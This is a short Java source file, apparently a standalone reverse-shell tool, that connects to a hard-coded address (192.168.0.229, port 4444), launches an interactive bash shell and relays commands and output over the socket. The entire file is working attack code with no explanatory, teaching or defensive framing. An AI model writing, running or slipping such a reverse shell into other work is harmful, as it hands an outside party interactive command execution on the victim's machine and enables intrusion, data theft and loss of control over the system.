import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "192.168.0.229";
        int port = 4444;
        try {
            Socket socket = new Socket(host, port);
            Process process = Runtime.getRuntime().exec("/bin/bash -i");
            InputStream procIn = process.getInputStream();
            OutputStream procOut = process.getOutputStream();
            
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = procIn.read(buffer)) != -1) {
                        socket.getOutputStream().write(buffer, 0, bytesRead);
                    }
                } catch (IOException ignored) {}
            }).start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                procOut.write((line + "\n").getBytes());
                procOut.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
